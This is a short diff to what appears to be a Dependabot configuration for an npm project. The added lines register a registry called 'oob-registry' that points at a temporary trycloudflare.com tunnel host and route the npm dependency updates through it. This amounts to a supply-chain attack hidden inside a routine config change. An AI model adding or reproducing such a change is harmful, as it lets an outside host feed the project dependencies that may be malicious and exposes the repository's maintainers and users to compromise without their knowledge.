@@ -1,7 +1,13 @@
 version: 2
+registries:
+  oob-registry:
+    type: npm-registry
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com
 updates:
   - package-ecosystem: npm
     directory: /
     schedule:
       interval: daily
     open-pull-requests-limit: 5
+    registries:
+      - oob-registry
